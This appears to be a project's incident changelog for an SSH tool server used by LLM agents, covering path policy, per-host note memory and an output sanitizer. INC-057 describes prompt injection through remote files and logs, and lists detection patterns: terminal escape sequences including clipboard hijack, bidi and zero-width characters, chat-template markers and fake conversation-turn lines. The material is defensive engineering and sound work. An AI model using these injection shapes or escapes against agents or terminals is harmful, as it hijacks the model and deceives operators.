**Operator-visible behavior change (v1.2.0):** Compose runs where `compose_file` resolves into a `restricted_paths` zone now raise `PathRestricted` instead of proceeding silently. Operators with compose files in allowlisted-but-restricted directories must move the file outside the restricted zone or remove the zone from `restricted_paths` for the relevant host.

**Tests:** 5 new parametrized unit tests in `tests/test_compose_path_policy.py` covering all five affected tools: restricted path raises `PathRestricted`; path inside allowlist but not restricted proceeds; path outside allowlist raises `PathNotAllowed`; symlink into restricted zone caught after canonicalization; both checks composed correctly (allowlist fail short-circuits before restricted check).

### INC-060 — `ssh_host_ping` also auto-injects agent notes (both layers ride on ping)

- **Date:** 2026-04-27 · **Severity:** Low · **Status:** resolved
- **Source:** internal-review (operator: "ssh ping should have option to show all notes too (on by default)")
- **Refs:** [config.py:60-69](src/ssh_mcp/config.py#L60-L69), [models/results.py:PingResult](src/ssh_mcp/models/results.py), [tools/host_tools.py:ssh_host_ping](src/ssh_mcp/tools/host_tools.py), [tests/test_ping_notes_injection.py](tests/test_ping_notes_injection.py)

INC-059 made `ssh_host_ping` auto-inject the operator-baseline notes (`hosts.toml`'s `notes` field) but explicitly held back the agent-side sidecar -- reasoning was "agent notes can grow to 256 KiB; auto-spamming every ping would bloat context." Operator pushed back: surfacing the LLM's past-self memory on ping is more important than the context-budget concern, especially because most agent sidecars are far smaller than the cap. Default-on, with an opt-out for context-budget-sensitive deployments.

**Implementation:**

- **New setting** `SSH_PING_INCLUDES_AGENT_NOTES: bool = True` ([config.py](src/ssh_mcp/config.py)) -- parallel structure to `SSH_PING_INCLUDES_NOTES`, independent toggle. Operator can mix-and-match (operator on / agent off, agent on / operator off, both on, both off).
- **New field** `PingResult.agent_notes: str | None = None` ([models/results.py](src/ssh_mcp/models/results.py)) -- populated when the setting is on AND `SSH_HOST_NOTES_DIR` is set AND the alias passes the existing filename regex AND the sidecar exists with non-empty content.
- **`ssh_host_ping` body** ([tools/host_tools.py](src/ssh_mcp/tools/host_tools.py)) reuses the same `_HOST_NOTES_ALIAS_RE` regex + `_read_sidecar` helper that `ssh_host_notes` uses. Defense-in-depth: even though `resolve_host` already filters aliases, the regex re-validates before path concatenation.

**Cross-tool consistency:**

- `_read_sidecar` returns None for both "file doesn't exist" and "0-byte file." A sidecar cleared by `ssh_host_notes_set("")` reads back as `agent_notes=None` -- matches what `ssh_host_notes` itself returns for the same scenario.

**Operator-side surfaces:**

- [.env.example](.env.example) documents the new setting alongside `SSH_PING_INCLUDES_NOTES`.
- [skills/ssh-host-ping/SKILL.md](skills/ssh-host-ping/SKILL.md) Returns example shows both fields; documents the context-budget caveat (sidecars up to 256 KiB) and the opt-out.
- [skills/ssh-host-notes/SKILL.md](skills/ssh-host-notes/SKILL.md) "When to call it" rewritten -- the dedicated tool is now mostly for re-reads after writes, or for setups that disable ping injection. The standard discovery flow puts ping first and `ssh_host_notes` second.
- [TOOLS.md](TOOLS.md) ping row updated with both layers.

**Tests** ([tests/test_ping_notes_injection.py](tests/test_ping_notes_injection.py)): 6 new cases on top of INC-059's 7 (13 total). Sidecar exists + setting on (default) -> `agent_notes` populated; sidecar missing -> None; setting off -> None even when sidecar exists; `SSH_HOST_NOTES_DIR=None` -> None (agent layer disabled at the directory level); 0-byte sidecar -> None (matches `ssh_host_notes` semantics); independence test exercising all four (operator x agent on/off) combinations.

**Catalog impact:** none. **Suite:** 826 unit pass (up from 820), 1 skipped. Ruff: one TC003 stdlib-`pathlib.Path` import flagged (test fixture only used Path for type annotations); moved to TYPE_CHECKING. Mypy strict: zero new errors.

### INC-059 — `ssh_host_ping` auto-injects operator notes — enforcement-by-ergonomics

- **Date:** 2026-04-25 · **Severity:** Low · **Status:** resolved
- **Source:** internal-review (operator: "did we make sure the llm loads the host memory first when connecting to a host?")
- **Refs:** [config.py:48-58](src/ssh_mcp/config.py#L48-L58), [models/results.py:PingResult](src/ssh_mcp/models/results.py), [tools/host_tools.py:ssh_host_ping](src/ssh_mcp/tools/host_tools.py), [tests/test_ping_notes_injection.py](tests/test_ping_notes_injection.py)

After INC-055 shipped the per-host two-layer memory (operator baseline + agent sidecar), the operator asked whether the LLM was actually being made to read it on first contact. Honest audit: **no, we hadn't enforced it**. The protections were:

- SKILL files for `ssh_host_notes` / `_append` / `_set` strongly recommended "ALWAYS, before doing anything substantive on a host you haven't worked with this session..." -- but SKILLs only load on demand.
- `ssh_host_list` returned `has_notes: bool` per host -- the LLM had to think to inspect it.
- Tool docstrings repeated the guidance in the catalog.

None of that **made** the LLM read the notes. If the LLM skipped the SKILL load and reached for `ssh_exec_run` straight off, the operator's hard-rule constraints never entered context.

**Fix: enforcement by ergonomics.** Auto-inject the operator-baseline notes into `ssh_host_ping`'s result. Ping is the canonical "I'm starting work on this host" probe -- LLMs reach for it naturally early in any host-targeted workflow. Riding the notes on ping means the LLM gets the operator's constraints into context for free, without remembering a separate `ssh_host_notes` call. The agent-side memory (the LLM's own session-spanning learned facts) still requires the dedicated tool -- that layer can grow large and doesn't belong in every ping.

**Three options were on the table:**

1. **Auto-inject into `ssh_host_ping`** (what shipped). Targeted, cheap, fits existing usage patterns.
2. Auto-inject into EVERY host-acting tool's result. Unmissable but invasive (~15 result models, every tool result grows).
3. Pre-tool-call hook that fails the first call to a host with `has_notes=True` until the LLM has called `ssh_host_notes(host)` that session. Most authoritarian; LLM would just learn to call notes blindly without reading.

Option 1 picked for the surface-area-to-value ratio. Operator approved with the addition of an opt-out flag.

**Implementation:**

- **New setting** `SSH_PING_INCLUDES_NOTES: bool = True` ([config.py](src/ssh_mcp/config.py)) -- default on; flip to false for tool-execution-only deployments where ping should stay minimal.
- **New field** `PingResult.operator_notes: str | None = None` ([models/results.py](src/ssh_mcp/models/results.py)) -- populated only when the setting is true AND the host has notes set.
- **`ssh_host_ping` body** ([tools/host_tools.py](src/ssh_mcp/tools/host_tools.py)) -- after the existing handshake, check `settings.SSH_PING_INCLUDES_NOTES and policy.notes and policy.notes.strip()`; if true, populate `operator_notes` with the stripped form. Whitespace-only notes are treated as absent (matches the same logic in `ssh_host_list.has_notes` and `ssh_host_notes`).

**What's NOT included in ping:**

- **Agent notes** (the LLM's own session-spanning sidecar at `<SSH_HOST_NOTES_DIR>/<alias>.md`). Those still require the dedicated `ssh_host_notes(host)` call. Reasoning: they can grow to 256 KiB (`SSH_HOST_NOTES_MAX_BYTES`); auto-spamming that into every ping would bloat tool catalogs. Operator notes are typically a few hundred bytes -- cheap to ride along.

**Surface updates:**

- [skills/ssh-host-ping/SKILL.md](skills/ssh-host-ping/SKILL.md) Returns example now shows `operator_notes`; "When to call it" emphasizes "read them before proposing a plan -- they may forbid the obvious approach you were about to take."
- [skills/ssh-host-notes/SKILL.md](skills/ssh-host-notes/SKILL.md) "When to call it" rewritten -- the operator layer is now described as "auto-injected into `ssh_host_ping`, so if you've pinged the host this session you already have it"; this tool is for the AGENT layer specifically.
- [TOOLS.md ssh_host_ping row](TOOLS.md) updated with the auto-inject behavior.
- [.env.example](.env.example) documents `SSH_PING_INCLUDES_NOTES`.

**Tests** ([tests/test_ping_notes_injection.py](tests/test_ping_notes_injection.py)): 7 cases pinning the contract -- notes present + setting on (default) injects; notes present + setting off omits (opt-out works); no notes set + setting on returns None; whitespace-only notes treated as absent; surrounding-whitespace stripped from injected text; setting disabled with no notes still None; existing ping fields (host / reachable / auth_ok / latency_ms / banner / fingerprint) unaffected by the addition.

**Catalog impact:** none -- this is a field addition, not a new tool. **Suite:** 820 unit pass (up from 813), 1 skipped. Ruff clean (one TC003 stdlib-Path import flagged; moved to TYPE_CHECKING). Mypy strict adds zero new errors.

### INC-058 — Output sanitizer extended to file-content surfaces (Pass A)

- **Date:** 2026-04-25 · **Severity:** Low · **Status:** resolved (Pass A)
- **Source:** internal-review (operator: "but technically this sanitization need to happen with all tool returning file content")
- **Refs:** [services/output_sanitizer.py](src/ssh_mcp/services/output_sanitizer.py) (new `scan()` helper), [models/results.py:DownloadResult](src/ssh_mcp/models/results.py), [models/systemctl.py](src/ssh_mcp/models/systemctl.py), [tools/systemctl_tools.py](src/ssh_mcp/tools/systemctl_tools.py), [tools/sftp_read_tools.py:155-208](src/ssh_mcp/tools/sftp_read_tools.py#L155-L208), [tests/test_output_warnings_propagation.py](tests/test_output_warnings_propagation.py)

INC-057 sanitized output at the `ssh.exec.run()` boundary, which covered all exec/sudo/shell/broadcast/docker tools transitively. Operator flagged that the same protections need to extend to the OTHER tools that surface raw remote text to the LLM: log lines from `journalctl` and systemd unit files / status (which already routed through `_run_systemctl` but discarded warnings), plus arbitrary file content from `ssh_sftp_download` (entirely separate code path -- never went through `exec.run()`).

**Audit revealed half the work was already free.** `_run_docker` returns `result.model_dump()` which already includes `output_warnings` from INC-057, so every docker tool that flows through it (`ssh_docker_logs` was the explicit ask, plus `ssh_docker_inspect` / `ssh_docker_ps` / etc.) already propagates warnings without touching the docker layer. Only the systemctl helpers and the SFTP download path needed work.

**Pass A scope (this incident):**

1. **`_run_systemctl` widened to a 4-tuple** -- now returns `(stdout, stderr, exit_code, output_warnings)` rather than dropping warnings on the floor. All 8 callers updated; the 5 that consume only the parsed exit-code state (`is_active`, `is_enabled`, `is_failed`, `list_units`, `show`) discard the new field with `_warnings`. The 3 that surface stdout to the LLM (`ssh_systemctl_status`, `ssh_systemctl_cat`, `ssh_journalctl`) propagate warnings into their result models.
2. **`SystemctlStatusResult`, `SystemctlCatResult`, `JournalctlResult` gained `output_warnings: list[str] = []`** -- empty default keeps the change backward-compatible for tests that construct the models without the field.
3. **`ssh_sftp_download` adds `output_warnings: list[str] = []` to `DownloadResult` and runs `scan()` on a UTF-8 view of the bytes** (errors='replace'). The `content_base64` payload is NOT modified -- binary safety is preserved; the warnings tell the LLM what a text decode would surface so it can `sanitize()` after decoding if it plans to process as text.
4. **New `scan(text) -> list[str]` helper** ([output_sanitizer.py](src/ssh_mcp/services/output_sanitizer.py)) is the flag-only sibling of `sanitize()`. Same six categories, but worded as "contains X (binary content; not stripped)" instead of "X stripped" -- callers that can't modify their content (binary downloads, future hex/raw-byte tools) need warnings without the strip side-effect.

**Defensive type-coercion bonus:** `ssh_sftp_download` now coerces `await sftp_file.read()` to `bytes` defensively (asyncssh's stub types it `str | bytes` even in `"rb"` mode). Eliminates two pre-existing mypy errors on this code path.

**The trojan-source meta-loop:** writing tests for the sanitizer required embedding the literal bidi / zero-width / C1 characters as test inputs, which the IDE's bidi-aware lint correctly flagged as the exact "obfuscated source code" pattern the sanitizer exists to defend against. Resolved by writing every non-ASCII codepoint as a `chr(0xNNNN)` call so the source file is pure ASCII and the runtime regex / test fixture is identical. The module docstring of `output_sanitizer.py` calls this out so future readers don't undo it.

**Tests** ([tests/test_output_warnings_propagation.py](tests/test_output_warnings_propagation.py)): 8 cases pinning the wiring -- `ssh_systemctl_status` / `_cat` / `_journalctl` propagate non-empty warnings from `_run_systemctl`; clean stdout yields empty warnings (not `None`); `ssh_sftp_download` clean text → no warnings; ANSI in downloaded content → warning AND base64 payload unchanged; NUL bytes in binary file → warning AND payload round-trips byte-for-byte; truncated downloads (above-cap) skip the scan and keep `output_warnings=[]`. The sanitizer itself is tested in [tests/test_output_sanitizer.py](tests/test_output_sanitizer.py) (40 cases).

**Pass B (deferred):**
- Filename scanning for `ssh_sftp_list` + `ssh_find` -- different shape (per-entry warnings, scan list-of-names not free-form text).
- Medium-priority structured fields: `ssh_host_processes` cmdlines, docker label / env / cmdline values from `ssh_docker_inspect` / `_ps` / etc.

These are real but lower-volume than the file-content / log-content paths shipped in Pass A. Open for a future turn when the use cases warrant.

**Suite:** 813 unit pass (up from 805 after adding 8 propagation tests; sanitizer tests already counted), 1 skipped. Ruff clean on touched files; mypy strict adds zero new errors (the 2 pre-existing `SSHCompletedProcess.signal` / splitlines errors stay, but the previous 2 in `sftp_read_tools.py:196,201` are now cleaned up by the defensive bytes-coercion).

### INC-057 — Output sanitizer for remote command output

- **Date:** 2026-04-25 · **Severity:** Medium · **Status:** resolved
- **Source:** internal-review (operator: "what happens when we run ssh_exec and the from the tool returned output is 'poisened'?")
- **Refs:** [services/output_sanitizer.py](src/ssh_mcp/services/output_sanitizer.py), [ssh/exec.py:128-160,297-340](src/ssh_mcp/ssh/exec.py#L128-L160), [models/results.py:ExecResult](src/ssh_mcp/models/results.py), [tests/test_output_sanitizer.py](tests/test_output_sanitizer.py)

`ssh.exec.run()` was piping remote stdout/stderr to the LLM verbatim. That's a real prompt-injection / display-hijack surface: an attacker who can write to a file the LLM later cats (motd, nginx logs, journal lines, package descriptions, ...) can embed text designed to manipulate the model or the operator's terminal. The encoding layer was safe (UTF-8 with `errors='replace'`, JSON-escape on serialize, output capped at `SSH_STDOUT_CAP_BYTES`) -- no process-level injection -- but the *content* itself was unfiltered.

**New sanitizer module.** [`services/output_sanitizer.py`](src/ssh_mcp/services/output_sanitizer.py) exposes `sanitize(text) -> (cleaned, warnings)` with two strict transformations and five flag-only checks:

- **Stripped (loss-bearing, recorded in warnings):**
  - ANSI escape sequences -- CSI, OSC, single-byte escapes. Regex covers parameters / intermediates / private-use ranges. Defeats `\x1b[2J` (clear screen), `\x1b]0;...\x07` (set terminal title), `\x1b]52;c;...\x07` (OSC 52 clipboard hijack), and cursor-positioning sequences.
  - NUL bytes (`\x00`). Survive UTF-8 decode as ` `, valid JSON but trips downstream tools and almost always indicates a bug or attack.
- **Flag-only (preserved verbatim, surfaced as warnings):**
  - Bidi overrides + isolates (`U+202D/E`, `U+2066-U+2069`) -- the "trojan source" attack that hides malicious filenames or shell snippets via right-to-left text-direction flips.
  - Zero-width characters (`U+200B-U+200D`, `U+FEFF`) -- steganography / identifier spoofing.
  - C1 control characters (`U+0080-U+009F`) -- some terminals interpret these as escape sequences even without the leading `\x1b`.
  - LLM protocol markers -- `<|im_end|>`, `<|im_start|>`, `</s>`, `[INST]`, `<|tool_call|>`, `<|begin_of_text|>`, `<|start_header_id|>`, etc. (case-insensitive). Catches the common shapes from OpenAI / Anthropic / open-source chat-template syntaxes.
  - Lines that mimic conversation turns -- `^User:` / `^Assistant:` / `^System:` / `^Human:` / `^AI:` (case-insensitive, line-start). The most common prompt-injection shape against chat-tuned models.

**Wired into `ssh.exec.run()` and `run_streaming()`** after truncation but before the bytes leave the function. Both stdout and stderr go through `sanitize()` independently; warnings from the two streams merge into a deduplicated list (so "ANSI escape sequences stripped" appears once even when both streams had ANSI). New `output_warnings: list[str] = []` field on `ExecResult` carries the result.

**Coverage.** Every tool that goes through `ssh.exec.run()` is now sanitized: `ssh_exec_run`, `ssh_exec_script`, `ssh_exec_run_streaming`, `ssh_sudo_exec`, `ssh_sudo_run_script`, `ssh_shell_exec`, `ssh_broadcast`, all 22 `ssh_docker_*` tools (via `_run_docker`'s `result.model_dump()`), and the systemctl tools (via `_run_systemctl` -- though those discarded warnings until INC-058 fixed them).

**Streaming caveat.** `chunk_cb` (the progress callback) sees the RAW (un-sanitized) bytes during streaming, by design -- progress messages are ephemeral and the sanitization cost would batch up the chunks (defeating the streaming). The final `ExecResult.stdout` is sanitized though, so the LLM's persisted view of the output never contains the unsafe bytes.

**Not defended against (out of scope):**
- Output that's semantically dangerous but lexically plain (e.g. logs containing real instructions in normal English). The LLM's training is the only defense here.
- Right-to-left override INSIDE a terminal-emulating MCP client. We strip nothing in `output_warnings` itself; the warnings list is the LLM's signal.

**Implementation note** (the trojan-source meta-loop): regex character classes for the bidi / zero-width / C1 ranges had to be written as `chr(0xNNNN)` calls rather than literal characters in the source. Embedding the literal codepoints triggered the IDE's bidi-aware lint correctly -- it's the exact "obfuscated source" pattern the file is here to defend against. Module docstring captures this so future readers don't "clean up" the chr() calls.

**Tests** ([tests/test_output_sanitizer.py](tests/test_output_sanitizer.py)): 40 cases. ANSI strip (color codes, cursor moves, OSC with BEL terminator, OSC with ST terminator, single-byte escapes); NUL strip; combined strip warnings; bidi flag (RLO / LRO / FSI / RLI / PDI); zero-width flag (ZWSP / ZWNJ / ZWJ / BOM); C1 flag; LLM marker flag (9 markers + case-insensitive); fake-conversation-turn flag (5 lead-words + 2 case variants + line-start anchoring); idempotency; warning de-duplication within a call; pathological-input timing bound (1 MiB processes in <1s).

**Catalog impact:** none -- this is a layer-internal change. **Suite:** 805 unit pass (up from 765 after adding 40 sanitizer cases), 1 skipped. Ruff clean; mypy strict adds zero new errors.

### INC-056 — `ssh_link` tool — hard + symbolic links with both-sides path validation

- **Date:** 2026-04-25 · **Severity:** Low · **Status:** resolved
- **Source:** internal-review (operator: "i want a tool that can do `ln` basic and with option `-P`"; later expanded with "why no `ln -s`?" + "we could just verify both sides of the link with our path restrictions")
- **Refs:** [tools/low_access_tools.py:386-535](src/ssh_mcp/tools/low_access_tools.py#L386-L535), [skills/ssh-link/SKILL.md](skills/ssh-link/SKILL.md), [tests/test_link.py](tests/test_link.py)

Operator wanted a hard-link tool with both default behavior and explicit `-P` (`--physical`) support. POSIX `ln -P` "make[s] hard links directly to symbolic links" -- when src is a symlink, the new hard link references the symlink's own inode rather than its target. Common case for pinning a release dir or migrating filesystems incrementally. Mid-flight scope expanded to also include `-s` (symbolic) per "why no `ln -s`?" follow-up: GNU `ln -s` is by far the more common operator pattern (every `current → release-vN` setup, `/etc/alternatives`, etc.) and SFTP supports it natively via `sftp.symlink()` -- no shell fallback needed. Without it the LLM would fall back to `ssh_exec_run "ln -s ..."` which violates the INC-054 "use dedicated tools, not shell" framing we just spent effort on.

**SFTP can't express `-P` for hard links.** asyncssh's `sftp.link()` translates to the SFTP-HARDLINK extension, which OpenSSH's sftp-server implements via `linkat(... AT_SYMLINK_FOLLOW)` -- always follows symlinks. There's no protocol-level way to opt out. So `-P` mode falls back to shell. SFTP DOES support `sftp.symlink()` directly, so symbolic mode is pure SFTP.

**Tool surface:**

```python
ssh_link(host, src, dst, ctx, symbolic=False, follow_symlinks=True)
```

`low-access + group:file-ops` tier (matches `ssh_cp` / `ssh_mv`). POSIX-only via `require_posix`. No `-f` (force) -- use `ssh_delete` first to overwrite (matches `ssh_upload`'s no-overwrite stance).

Three modes:

- **`symbolic=False` + `follow_symlinks=True` (default, `ln -L`):** canonicalize src + dst normally, call `sftp.link(src_canonical, dst_canonical)`. Pure SFTP. Server-side semantics: link to the inode the symlink chain resolves to. Existing dst raises `SFTPError(FX_FAILURE)` -- propagated to the caller.
- **`symbolic=False` + `follow_symlinks=False` (`ln -P`):** canonicalize the *parent* of src (must exist + be allowlisted), `lstat` confirms src exists in that dir, then shell-fall-back to `shlex.join(["ln", "-P", "--", src_full, dst_canonical])` via `conn.run`. Same pattern as `ssh_cp` / `ssh_mv`'s shell fallbacks -- low-access tier doesn't require `ln` in `command_allowlist`. Path-policy weakening: canonicalizing src would resolve the symlink we want to point at, defeating `-P`'s point. Compromise check: "the symlink lives in an allowed dir."
- **`symbolic=True` (`ln -s`):** pure SFTP via `sftp.symlink(src, dst_canonical)`. `src` stored VERBATIM (preserves relative-link semantics: `ln -s ../foo bar` keeps `../foo` on disk). Per GNU `ln`'s "Using -s ignores -L and -P", `follow_symlinks` is silently ignored. **Both sides of the link path-validated** (per operator's "verify both sides" direction): dst goes through normal `canonicalize_and_check`; src is treated as a TARGET STRING (not a real path -- POSIX permits dangling symlinks, src may not exist) and validated string-wise:
  1. `reject_bad_characters(src)` rejects NUL bytes / control chars.
  2. Relative targets resolved against `dst`'s parent dir.
  3. `posixpath.normpath` collapses `..` / `//`.
  4. `check_in_allowlist` + `check_not_restricted` against the resolved form.
  5. Original `src` text passed to `sftp.symlink()` -- policy decision was made on the normalized form, but the on-disk symlink keeps the operator's intent.

**Why both-sides validation for symbolic links:** defense-in-depth at write-time + read-time beats just read-time. A read THROUGH a symlink would re-trigger path policy (`canonicalize` follows symlinks during real-path), so the read tools already gate the actual access. But validating at link-creation time ALSO catches the operator-prompt-injection class where a malicious prompt creates `link -> /etc/shadow` as a marker that other workflows then chase. Bonus: dangling symlinks remain ALLOWED (POSIX semantics) -- we don't realpath or lstat the target.

**Defensive details:**
- `-P` mode rejects directory-only src (`posixpath.basename(src) == ""`) before any SFTP call.
- `-P` mode lstat-failure surfaces as a clean `ValueError` with the canonical path, not a raw `SFTPError`.
- Shell `ln -P` non-zero exit raises `WriteError` with the exit code + stderr (no silent failure).
- Symbolic mode rejects NUL / control bytes in target via `reject_bad_characters`.
- Symbolic mode allows dangling targets (POSIX-correct) -- string validation only, no realpath / lstat.
- argv-quoted via `shlex.join` -- no string interpolation into the shell command.

**Tests** ([tests/test_link.py](tests/test_link.py)): 14 cases. Hard-link side: default mode calls SFTP `link()` with canonical paths; propagates `SFTPError` on existing dst; `-P` mode skips SFTP and runs `ln -P --` with right argv; `-P` mode raises clean `ValueError` on lstat-missing; `-P` mode shell failure raises `WriteError`; `-P` mode rejects directory-only src; Windows raises `PlatformNotSupported`. Symbolic side: `sftp.symlink` called with verbatim target (preserves relative-link semantics); dangling targets succeed (no lstat call); target outside allowlist raises `PathNotAllowed`; relative target resolved against dst's parent for the policy check; NUL bytes in target rejected up front; `follow_symlinks` silently ignored when `symbolic=True` (matches GNU "Using -s ignores -L and -P").

**Catalog:** 74 tools across 9 groups (up from 73). **Suite:** 765 unit pass (up from 750), 1 skipped. Ruff clean on touched files; mypy strict adds zero new errors (4 pre-existing `asyncssh.sftp.FX_*` / `str.decode` patterns).

The "should we flip the default to match GNU `ln`'s `-P` default" question (raised after the operator quoted the GNU man page) was deferred -- the user moved on without resolving it. Current default remains `follow_symlinks=True` (matches OpenSSH's SFTP `link()` natively, no shell needed for the common case). Easy to flip later if real-world surprise materializes.

### INC-055 — Per-host two-layer memory: operator baseline + agent-written sidecar

- **Date:** 2026-04-25 · **Severity:** Low · **Status:** resolved
- **Source:** internal-review (operator: "I want some kind of host memory the LLM writes itself, like markdown files")
- **Refs:** [config.py:32-46](src/ssh_mcp/config.py#L32-L46), [models/policy.py:117-126](src/ssh_mcp/models/policy.py#L117-L126), [models/results.py:185-225](src/ssh_mcp/models/results.py#L185-L225), [tools/host_tools.py](src/ssh_mcp/tools/host_tools.py), [tests/test_host_notes.py](tests/test_host_notes.py), [skills/ssh-host-notes/](skills/ssh-host-notes/), [skills/ssh-host-notes-append/](skills/ssh-host-notes-append/), [skills/ssh-host-notes-set/](skills/ssh-host-notes-set/)

Operator wanted persistent per-host memory the LLM could write to itself, like CLAUDE.md but per-host -- so durable lessons ("`deploy@` is in the docker group; sudo not needed for docker", "operator rejected `apt install apache2`", "myapp.service has restart=always but no health check") survive across sessions instead of being re-learned (or worse, re-attempted-and-rejected) every time.

**Misunderstanding pivot.** First pass shipped operator-write / agent-read only -- a `notes` field on `HostPolicy` loaded from `hosts.toml`, plus a read-only `ssh_host_notes(host)` tool. Operator clarified: the LLM should write its own notes; the operator's role is to seed hard rules, not to maintain everything. Pivoted to a **two-layer model** that keeps the first pass useful and adds the missing layer:

- **Layer 1 -- operator notes** (`hosts.toml`'s `notes = """..."""` field). Hard rules, READ-ONLY to the agent. This is where "never install apache2" lives.
- **Layer 2 -- agent notes** (sidecar markdown at `<SSH_HOST_NOTES_DIR>/<alias>.md`, default `notes/<alias>.md`). The LLM's own working memory. READ via `ssh_host_notes`, WRITE via `ssh_host_notes_append` (everyday use; appends a `## <UTC iso8601>\n<entry>` block) or `ssh_host_notes_set` (whole-file replace, for consolidation).

**Tools shipped (3):**

- **`ssh_host_notes(host)`** -- `safe + read + group:host`. Returns both layers in one call: `{operator_notes, agent_notes, agent_notes_path, has_notes}`. `has_notes` is true when EITHER layer is non-empty. Cheap: in-memory operator lookup + one local FS read for the sidecar.
- **`ssh_host_notes_append(host, entry)`** -- `low-access + group:host`. Appends a timestamped markdown entry to the sidecar. First call seeds a header (`# Agent notes for <alias> (<hostname>)`); subsequent calls just add `\n\n## <UTC iso8601>\n<entry>\n`. Atomic temp+`os.replace`. Capped at `SSH_HOST_NOTES_MAX_BYTES` (default 256 KiB). Empty / whitespace-only entries rejected.
- **`ssh_host_notes_set(host, content)`** -- `low-access + group:host`. Replaces the entire sidecar verbatim. Used for consolidation (read via `_notes`, prune stale, restructure, write back) or reset (empty string clears to zero bytes). Same atomicity + cap as append.

**Discovery flag.** `ssh_host_list`'s `HostListEntry` carries `has_notes: bool` -- true when EITHER layer is non-empty for that host. The flag is computed cheaply (one `stat` per host). LLMs use the standard discovery flow: `ssh_host_list` → for any host with `has_notes: true` you're about to touch, `ssh_host_notes(host=...)` → drill into the actual content.

**Defensive sidecar paths.** Aliases are validated against `^[A-Za-z0-9._-]+$` before being concatenated into a sidecar filename. Aliases already come through `resolve_host` (which only accepts known keys), but the regex is defense-in-depth against any future code path that bypasses resolution -- a malicious / typoed alias can't escape `SSH_HOST_NOTES_DIR` via `..` or `/`. Atomic write (temp file + `os.replace`) means a crash mid-write leaves the temp (cleaned on next attempt), never a partial sidecar.

**Settings.** Two new fields in `Settings`:

- `SSH_HOST_NOTES_DIR: Path | None = Path("notes")` -- the sidecar directory. None disables the agent layer entirely (operator layer remains).
- `SSH_HOST_NOTES_MAX_BYTES: int = 256 * 1024` -- per-sidecar cap. The append tool's error message tells the LLM to consolidate via `_set` when approaching this.

**Operator-side surfaces.** `hosts.toml.example` documents the operator `notes` field with explicit framing about the two-layer model (operator-controlled vs agent-written). `.env.example` documents `SSH_HOST_NOTES_DIR` + `SSH_HOST_NOTES_MAX_BYTES`. `.gitignore` excludes `notes/` so per-deployment agent state doesn't leak into source control.

**Three SKILLs authored:** `ssh-host-notes` (read), `ssh-host-notes-append` (everyday write), `ssh-host-notes-set` (consolidation). The append skill explicitly lists what NOT to record (re-derivable facts, ephemeral state, secrets, long verbatim output) to keep the sidecar useful instead of bloated.

**Test coverage:** 20 cases in [tests/test_host_notes.py](tests/test_host_notes.py) -- operator-layer parsing, `has_notes` flag across both layers (operator only, agent only, both, whitespace-only operator field, 0-byte sidecar, dir disabled), `ssh_host_notes` returning both layers cleanly, append creates header on first call + preserves history on subsequent calls, append rejects empty entries + enforces size cap + raises when dir disabled + creates parent dir, set writes verbatim + replaces existing + clears on empty content + enforces cap, unknown-alias propagation through `resolve_host` for all three tools.

Catalog: 73 tools across 9 groups (up from 71). Suite: 750 unit pass (up from 736), 1 skipped. Ruff + mypy strict clean on touched files.

**Three SKILL traps hit + dodged on the way:**

1. **Triple-quote inside a docstring** -- writing the literal TOML syntax `notes = """ ... """` inside a Python `"""..."""` docstring closes the docstring early. SyntaxError. Fixed by describing the field without showing the literal triple-quote in the docstring (the SKILL.md still shows it).
2. **ASCII guard in `test_skills_ascii.py`** -- I used a UTF-8 em-dash in the front-matter description of `ssh-host-notes/SKILL.md`. The skill loader has been ASCII-only since 2026-04-14 (FastMCP 3.2.4 cp1252 bug). Fixed by replacing with `--`.
3. **Pydantic table-column count** -- the INCIDENTS.md status row had `notes: str | None` with an unescaped pipe, which markdownlint counts as a column separator and reported "extra cells". Reworded the row to avoid the literal `|` character.

### INC-054 — `ssh_exec_run` heredocs misused for file writes; ergonomics + framing fix

- **Date:** 2026-04-25 · **Severity:** Low · **Status:** resolved
- **Source:** internal-review (operator observation: long opaque `ssh_exec_run` calls in tool-output transcripts; couldn't tell at a glance if it was just a file write)
- **Refs:** [tools/exec_tools.py:32-86](src/ssh_mcp/tools/exec_tools.py#L32-L86), [tools/low_access_tools.py:401-466](src/ssh_mcp/tools/low_access_tools.py#L401-L466), [tools/low_access_tools.py:577-606](src/ssh_mcp/tools/low_access_tools.py#L577-L606), [skills/ssh-exec-run/SKILL.md](skills/ssh-exec-run/SKILL.md), [skills/ssh-upload/SKILL.md](skills/ssh-upload/SKILL.md), [skills/ssh-deploy/SKILL.md](skills/ssh-deploy/SKILL.md), [tests/test_upload_payload.py](tests/test_upload_payload.py)

Operator reported seeing very long `ssh_exec_run` invocations in tool-output transcripts that they couldn't easily distinguish from "create a file with content X" patterns. Two failure modes converged: (a) `ssh_exec_run`'s discouraging language was a single bullet in a 14-row mapping table, easy for an LLM to gloss over; (b) the `ssh_upload` / `ssh_deploy` payload required `content_base64`, which is real friction for plain-text configs / scripts / code -- the LLM took the "natural" path of `cat > path <<'EOF' ... EOF` via `ssh_exec_run`, which bypasses path policy, atomic write, AND the structured audit line.

**Fix (two parallel edits):**

1. **Sharpen the framing** in `ssh_exec_run` docstring + [skills/ssh-exec-run/SKILL.md](skills/ssh-exec-run/SKILL.md): added an explicit `### NEVER use ssh_exec_run for file writes` section with the four most common patterns called out by name (`cat > path <<EOF`, `tee path`, `echo > path`, `printf > path`) and the rationale (path policy + atomic write + audited canonical path are missing from heredoc-via-shell). Mapping table expanded from 14 rows to ~22 rows, with file-write patterns ALL explicitly mapping to `ssh_upload(content_text=...)`. Added rows for `ssh_broadcast`, `ssh_transfer`, `ssh_host_network`, `ssh_user_info`, `ssh_file_hash`, `ssh_systemctl_*`, `ssh_journalctl` (which had landed in INC-052 / earlier sprints but never made it into the cheat sheet).

2. **Remove the encoding friction** that gave LLMs a reason to avoid `ssh_upload` / `ssh_deploy`: added `content_text: str | None = None` as a sibling to `content_base64`. Pass exactly one. Plain UTF-8 (configs, scripts, code, JSON, Markdown) goes via `content_text`; binaries (tarballs, images) keep using `content_base64`. New helper [_resolve_upload_payload](src/ssh_mcp/tools/low_access_tools.py#L445) validates the exactly-one-of contract and returns the bytes that hit disk -- shared between `ssh_upload` and `ssh_deploy`. Empty string is a deliberate valid input (writes a zero-byte file -- you'd otherwise have to `: > path` via `ssh_exec_run`); the validator uses `is not None`, not truthiness, so `content_text=""` doesn't trip the "neither was set" guard. Existing callers passing `content_base64=...` keep working unchanged -- the parameter went from required to optional but stayed in the same position; existing positional usage still resolves.

